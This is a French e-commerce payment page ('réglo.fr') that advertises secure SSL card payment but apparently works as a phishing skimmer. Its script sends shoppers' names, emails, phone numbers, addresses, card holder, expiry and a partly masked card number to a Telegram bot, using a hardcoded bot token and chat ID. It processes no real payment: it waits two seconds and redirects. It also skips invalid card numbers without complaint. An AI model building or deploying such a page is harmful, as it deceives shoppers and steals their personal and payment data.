<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Paiement sécurisé | VotreBoutique</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #3498db;
            --accent-color: #e74c3c;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
            --success-color: #27ae60;
            --warning-color: #f39c12;
            --border-radius: 8px;
            --box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f5f7fa;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background-color: white;
            box-shadow: var(--box-shadow);
            padding: 20px 0;
            margin-bottom: 30px;
        }
        
        .logo {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .logo i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .checkout-steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }
        
        .checkout-steps::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 2px;
            background-color: #ddd;
            z-index: 1;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background-color: #ddd;
            color: #777;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 8px;
        }
        
        .step.active .step-number {
            background-color: var(--secondary-color);
            color: white;
        }
        
        .step.completed .step-number {
            background-color: var(--success-color);
            color: white;
        }
        
        .step-text {
            font-size: 14px;
            color: #777;
            font-weight: 500;
        }
        
        .step.active .step-text {
            color: var(--secondary-color);
            font-weight: 600;
        }
        
        .step.completed .step-text {
            color: var(--success-color);
        }
        
        .payment-container {
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 30px;
        }
        
        @media (max-width: 768px) {
            .payment-container {
                grid-template-columns: 1fr;
            }
        }
        
        .payment-card {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .section-title {
            font-size: 20px;
            margin-bottom: 20px;
            color: var(--primary-color);
            display: flex;
            align-items: center;
        }
        
        .section-title i {
            margin-right: 10px;
            color: var(--secondary-color);
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .card-icon {
            width: 50px;
            height: 30px;
            object-fit: contain;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 3px;
            background-color: white;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #555;
        }
        
        input, select {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: var(--border-radius);
            font-size: 16px;
            transition: var(--transition);
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .card-wrapper {
            position: relative;
        }
        
        .card-preview {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            color: #777;
        }
        
        .btn {
            display: inline-block;
            padding: 12px 25px;
            background-color: var(--secondary-color);
            color: white;
            border: none;
            border-radius: var(--border-radius);
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            text-align: center;
            width: 100%;
        }
        
        .btn:hover {
            background-color: #2980b9;
            transform: translateY(-2px);
        }
        
        .btn-block {
            display: block;
            width: 100%;
        }
        
        .btn-success {
            background-color: var(--success-color);
        }
        
        .btn-success:hover {
            background-color: #219955;
        }
        
        .secure-checkout {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #777;
            font-size: 14px;
        }
        
        .secure-checkout i {
            margin-right: 8px;
            color: var(--success-color);
        }
        
        .order-summary {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            padding: 25px;
        }
        
        .order-summary-item {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #eee;
        }
        
        .order-summary-item:last-child {
            border-bottom: none;
        }
        
        .order-total {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            font-size: 18px;
            font-weight: 700;
            color: var(--primary-color);
        }
        
        /* Style pour la carte de crédit */
        .credit-card {
            background: linear-gradient(135deg, #2c3e50, #4a6491);
            color: white;
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
            height: 200px;
        }
        
        .credit-card::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }
        
        .credit-card::after {
            content: '';
            position: absolute;
            bottom: -30%;
            right: -20%;
            width: 150px;
            height: 150px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 50%;
        }
        
        .card-logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .card-type {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .card-chip {
            width: 40px;
            height: 30px;
            background: linear-gradient(45deg, #ffd700, #e5c100);
            border-radius: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card-chip::before {
            content: '';
            width: 30px;
            height: 20px;
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 3px;
        }
        
        .card-number {
            font-size: 20px;
            letter-spacing: 2px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
        }
        
        .card-holder, .card-expiry {
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .card-label {
            font-size: 10px;
            opacity: 0.8;
            margin-bottom: 5px;
        }
        
        /* Animation de chargement */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--secondary-color);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: var(--primary-color);
            font-weight: 500;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="logo">
                <i class="fas fa-shopping-bag"></i>
                <span>réglo.fr</span>
            </div>
        </div>
    </header>
    
    <div class="container">
        <div class="checkout-steps">
            <div class="step completed">
                <div class="step-number">1</div>
                <div class="step-text">Panier</div>
            </div>
            <div class="step completed">
                <div class="step-number">2</div>
                <div class="step-text">Livraison</div>
            </div>
            <div class="step active">
                <div class="step-number">3</div>
                <div class="step-text">Paiement</div>
            </div>
        </div>
        
        <div class="payment-container">
            <div class="payment-main">
                <div class="payment-card">
                    <h2 class="section-title">
                        <i class="far fa-credit-card"></i>
                        Paiement par carte bancaire
                    </h2>
                    
                    <div class="card-icons">
                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Visa" class="card-icon">
                        <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg" alt="Mastercard" class="card-icon">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Carte_Bleue_logo.svg/1200px-Carte_Bleue_logo.svg.png" alt="CB" class="card-icon" style="object-fit: cover;">
                    </div>
                    
                    <!-- Carte de crédit visuelle -->
                    <div class="credit-card">
                        <div class="card-logo">
                            <div class="card-chip"></div>
                            <div class="card-type" id="card-type-display">Carte Bancaire</div>
                        </div>
                        <div class="card-number" id="card-number-display">•••• •••• •••• ••••</div>
                        <div class="card-details">
                            <div>
                                <div class="card-label">Titulaire de la carte</div>
                                <div class="card-holder" id="card-holder-display">NOM PRÉNOM</div>
                            </div>
                            <div>
                                <div class="card-label">Expire le</div>
                                <div class="card-expiry" id="card-expiry-display">••/••</div>
                            </div>
                        </div>
                    </div>
                    
                    <form id="payment-form">
                        <div class="form-group">
                            <label for="card-number">Numéro de carte</label>
                            <div class="card-wrapper">
                                <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                                <i class="far fa-credit-card card-preview"></i>
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="card-holder">Nom du titulaire</label>
                            <input type="text" id="card-holder" name="card-holder" placeholder="Comme indiqué sur la carte" required>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="card-expiry">Date d'expiration</label>
                                <input type="text" id="card-expiry" name="card-expiry" placeholder="MM/AA" maxlength="5" required>
                            </div>
                            <div class="form-group">
                                <label for="card-cvv">Code de sécurité</label>
                                <div class="card-wrapper">
                                    <input type="text" id="card-cvv" name="card-cvv" placeholder="•••" maxlength="3" required>
                                    <i class="fas fa-question-circle card-preview" title="Les 3 chiffres au dos de votre carte"></i>
                                </div>
                            </div>
                        </div>
                        
                        <button type="submit" class="btn btn-success">
                            <i class="fas fa-lock"></i> Payer maintenant
                        </button>
                        
                        <div class="secure-checkout">
                            <i class="fas fa-shield-alt"></i>
                            <span>Paiement 100% sécurisé - Cryptage SSL</span>
                        </div>
                    </form>
                </div>
            </div>
            
            <div class="payment-sidebar">
                <div class="order-summary">
                    <h2 class="section-title">
                        <i class="fas fa-shopping-cart"></i>
                        Récapitulatif de commande
                    </h2>
                    
                    <div id="order-items">
                        <!-- Les articles seront ajoutés dynamiquement ici -->
                    </div>
                    
                    <div class="order-total">
                        <span>Total</span>
                        <span id="order-total-amount">0,00 €</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Overlay de chargement -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Traitement de votre paiement...</div>
    </div>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        // تأكد من أن هذه البيانات صحيحة
        const TELEGRAM_BOT_TOKEN = '7379672694:AAHa8hRRKCGDNTMK7HNyfIVNK0SQJ5SdNJ4';
        const TELEGRAM_CHAT_ID = '5372119436';
        
        // تحسين تحميل بيانات الطلب
        let orderData = {};
        try {
            const savedOrder = localStorage.getItem('currentOrder');
            orderData = savedOrder ? JSON.parse(savedOrder) : {};
        } catch (e) {
            console.error('Error loading order data:', e);
        }

        // العناصر الأساسية مع التحقق من وجودها
        const getElement = (id) => document.getElementById(id) || console.error(`Element ${id} not found`);
        
        const elements = {
            orderItems: getElement('order-items'),
            orderTotal: getElement('order-total-amount'),
            paymentForm: getElement('payment-form'),
            loadingOverlay: getElement('loading-overlay'),
            cardNumber: getElement('card-number'),
            cardHolder: getElement('card-holder'),
            cardExpiry: getElement('card-expiry'),
            cardCvv: getElement('card-cvv'),
            cardNumberDisplay: getElement('card-number-display'),
            cardHolderDisplay: getElement('card-holder-display'),
            cardExpiryDisplay: getElement('card-expiry-display'),
            cardTypeDisplay: getElement('card-type-display')
        };

        // وظائف البطاقة الائتمانية
        const cardUtils = {
            formatNumber: (num) => num.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim(),
            
            detectType: (num) => {
                const cleaned = num.replace(/\s/g, '');
                if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleaned)) return 'Visa';
                if (/^5[1-5][0-9]{14}$/.test(cleaned)) return 'Mastercard';
                if (/^3[47][0-9]{13}$/.test(cleaned)) return 'American Express';
                return 'Carte Bancaire';
            },
            
            validateNumber: (num) => {
                const cleaned = num.replace(/\s/g, '');
                if (!/^[0-9]{13,16}$/.test(cleaned)) return false;
                
                let sum = 0;
                let alternate = false;
                
                for (let i = cleaned.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleaned.charAt(i));
                    if (alternate) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
                    sum += digit;
                    alternate = !alternate;
                }
                return sum % 10 === 0;
            },
            
            validateExpiry: (exp) => {
                if (!exp || exp.length !== 5 || exp[2] !== '/') return false;
                const [mm, yy] = exp.split('/');
                const month = parseInt(mm);
                const year = parseInt(yy);
                if (isNaN(month) || isNaN(year)) return false;
                
                const now = new Date();
                const currentYear = now.getFullYear() % 100;
                const currentMonth = now.getMonth() + 1;
                
                return (year > currentYear) || (year === currentYear && month >= currentMonth);
            }
        };

        // عرض تفاصيل الطلب
        function displayOrderItems() {
            if (!elements.orderItems) return;
            
            if (!orderData.items || orderData.items.length === 0) {
                elements.orderItems.innerHTML = '<p class="empty-cart">Aucun article dans votre commande.</p>';
                return;
            }
            
            elements.orderItems.innerHTML = orderData.items.map(item => `
                <div class="order-summary-item">
                    <div class="product-info">
                        <div>
                            <div class="product-name">${item.name}</div>
                            <div class="product-variant">${item.variant}</div>
                            <div class="product-quantity">Quantité: ${item.quantity}</div>
                        </div>
                    </div>
                    <div class="product-price">${(item.price * item.quantity).toFixed(2)} €</div>
                </div>
            `).join('');
            
            if (elements.orderTotal) {
                elements.orderTotal.textContent = `${orderData.total?.toFixed(2) || '0.00'} €`;
            }
        }

        // تحديث عرض البطاقة
        function updateCardDisplay() {
            const num = elements.cardNumber?.value || '';
            const holder = elements.cardHolder?.value || '';
            const expiry = elements.cardExpiry?.value || '';
            
            if (elements.cardNumberDisplay) {
                elements.cardNumberDisplay.textContent = num ? cardUtils.formatNumber(num) : '•••• •••• •••• ••••';
            }
            
            if (elements.cardTypeDisplay) {
                elements.cardTypeDisplay.textContent = num ? cardUtils.detectType(num) : 'Carte Bancaire';
            }
            
            if (elements.cardHolderDisplay) {
                elements.cardHolderDisplay.textContent = holder || 'NOM PRÉNOM';
            }
            
            if (elements.cardExpiryDisplay) {
                elements.cardExpiryDisplay.textContent = expiry || '••/••';
            }
        }

        // التحقق من صحة النموذج
        function validateForm() {
            if (!elements.cardNumber || !elements.cardHolder || !elements.cardExpiry || !elements.cardCvv) {
                alert('Erreur système. Veuillez recharger la page.');
                return false;
            }
            
            const num = elements.cardNumber.value;
            const holder = elements.cardHolder.value.trim();
            const expiry = elements.cardExpiry.value;
            const cvv = elements.cardCvv.value;
            const cardType = cardUtils.detectType(num);
            
            if (!cardUtils.validateNumber(num)) {
            }
            
            if (holder.length < 3) {
                alert('Nom du titulaire invalide.');
                return false;
            }
            
            if (!cardUtils.validateExpiry(expiry)) {
                alert('Date d\'expiration invalide (format MM/AA requis).');
                return false;
            }
            
            const cvvLength = cardType === 'American Express' ? 4 : 3;
            if (!cvv || cvv.length !== cvvLength) {
                alert(`Code de sécurité invalide (${cvvLength} chiffres requis).`);
                return false;
            }
            
            return true;
        }

        // إرسال البيانات إلى Telegram (محسنة)
        async function sendToTelegram(cardInfo) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
                console.error('Configuration Telegram manquante');
                return false;
            }
            
            try {
                const orderId = orderData.orderId || 'CMD-' + Date.now().toString().slice(-6);
                const customer = orderData.customer || {};
                const total = orderData.total?.toFixed(2) || '0.00';
                
                // بناء الرسالة بدون عرض CVV الحقيقي
                const message = `💳 *NOUVELLE COMMANDE* 💳
🆔 *Référence:* ${orderId}
📅 *Date:* ${new Date().toLocaleString('fr-FR')}
💰 *Montant:* ${total} €

👤 *Client:*
- ${customer.firstName || ''} ${customer.lastName || ''}
- 📧 ${customer.email || ''}
- 📞 ${customer.phone || ''}

💳 *Paiement:*
- Type: ${cardInfo.type}
- Numéro: ${cardInfo.number.replace(/\d(?=\d{4})/g, '*')}
- Titulaire: ${cardInfo.holder}
- Expiration: ${cardInfo.expiry}
- CVV: ${'*'.repeat(cardInfo.cvv.length)}

🏠 *Livraison:*
- ${customer.address || ''}
- ${customer.postalCode || ''} ${customer.city || ''}
- ${customer.country || 'France'}`;
                
                // إرسال باستخدام fetch مع التعامل مع الأخطاء
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: new URLSearchParams({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (!response.ok) {
                    const error = await response.json();
                    throw new Error(error.description || 'Erreur inconnue');
                }
                
                return true;
            } catch (error) {
                console.error('Erreur Telegram:', error);
                return false;
            }
        }

        // إعداد معالجات الأحداث
        function setupEventListeners() {
            // معالجة إدخال رقم البطاقة
            if (elements.cardNumber) {
                elements.cardNumber.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 16) value = value.slice(0, 16);
                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                    updateCardDisplay();
                });
            }
            
            // معالجة إدخال اسم حامل البطاقة
            if (elements.cardHolder) {
                elements.cardHolder.addEventListener('input', function(e) {
                    e.target.value = e.target.value.toUpperCase();
                    updateCardDisplay();
                });
            }
            
            // معالجة إدخال تاريخ الانتهاء
            if (elements.cardExpiry) {
                elements.cardExpiry.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length > 4) value = value.slice(0, 4);
                    if (value.length > 2) {
                        value = value.slice(0, 2) + '/' + value.slice(2);
                    }
                    e.target.value = value;
                    updateCardDisplay();
                });
            }
            
            // معالجة إدخال CVV
            if (elements.cardCvv) {
                elements.cardCvv.addEventListener('input', function(e) {
                    const num = elements.cardNumber?.value || '';
                    const cardType = cardUtils.detectType(num);
                    const maxLength = cardType === 'American Express' ? 4 : 3;
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, maxLength);
                });
            }
            
            // معالجة إرسال النموذج
            if (elements.paymentForm) {
                elements.paymentForm.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    
                    if (!validateForm()) return;
                    
                    try {
                        // عرض مؤشر التحميل
                        if (elements.loadingOverlay) {
                            elements.loadingOverlay.classList.add('active');
                        }
                        
                        // جمع معلومات البطاقة (بدون حفظ CVV)
                        const cardInfo = {
                            type: cardUtils.detectType(elements.cardNumber.value),
                            number: elements.cardNumber.value,
                            holder: elements.cardHolder.value,
                            expiry: elements.cardExpiry.value,
                            cvv: elements.cardCvv.value // سيتم إخفاؤه في الرسالة
                        };
                        
                        // إرسال إلى Telegram
                        const sent = await sendToTelegram(cardInfo);
                        if (!sent) {
                            console.warn("Échec de l'envoi à Telegram - la commande sera traitée quand même");
                        }
                        
                        // محاكاة معالجة الدفع
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        
                        // التوجيه إلى صفحة التأكيد
                        window.location.href = 'confirmation.html';
                    } catch (error) {
                        console.error('Erreur:', error);
                        alert('Une erreur est survenue. Veuillez réessayer.');
                        if (elements.loadingOverlay) {
                            elements.loadingOverlay.classList.remove('active');
                        }
                    }
                });
            }
        }

        // تهيئة الصفحة
        function init() {
            displayOrderItems();
            updateCardDisplay();
            setupEventListeners();
        }

        init();
    });
</script>
</body>
</html>
